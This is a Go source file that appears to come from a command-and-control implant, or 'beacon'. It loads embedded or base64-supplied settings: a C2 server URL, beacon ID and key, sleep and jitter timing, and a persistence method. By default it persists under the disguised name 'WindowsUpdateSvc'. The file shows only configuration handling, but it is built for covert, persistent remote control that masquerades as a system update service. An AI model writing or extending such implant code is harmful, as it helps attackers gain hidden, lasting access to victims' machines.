package main

import (
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"strings"
)

var configJSON []byte

var cfgB64 string

type beaconConfig struct {
	C2URL         string `json:"c2_url"`
	BeaconID      string `json:"beacon_id"`
	Sleep         int    `json:"sleep"`
	Jitter        int    `json:"jitter"`
	Proto         string `json:"proto"`
	AllowedIPs    string `json:"allowed_ips"`
	BlockedIPs    string `json:"blocked_ips"`
	BeaconKey     string `json:"beacon_key"`
	PersistMethod string `json:"persist_method"`
	PersistName   string `json:"persist_name"`
}

var cfg = loadBeaconConfig()

// sanitizePersistName keeps only characters that are safe in service,
// task and file names across platforms.
func sanitizePersistName(name string) string {
	var b strings.Builder
	for _, r := range name {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-', r == '.':
			b.WriteRune(r)
		}
	}
	out := strings.Trim(b.String(), "-.")
	if out == "" {
		out = "update-agent"
	}
	return out
}

func loadBeaconConfig() beaconConfig {
	c := beaconConfig{
		C2URL:         "http://127.0.0.1:8080",
		Sleep:         5,
		Jitter:        10,
		Proto:         "http",
		PersistMethod: "auto",
		PersistName:   "WindowsUpdateSvc",
	}

	raw := configJSON
	if cfgB64 != "" {
		if decoded, err := base64.StdEncoding.DecodeString(cfgB64); err == nil {
			raw = decoded
		}
	}
	if len(raw) > 0 {
		// Fields absent from the JSON keep the defaults above.
		_ = json.Unmarshal(raw, &c)
	}
	return c
}
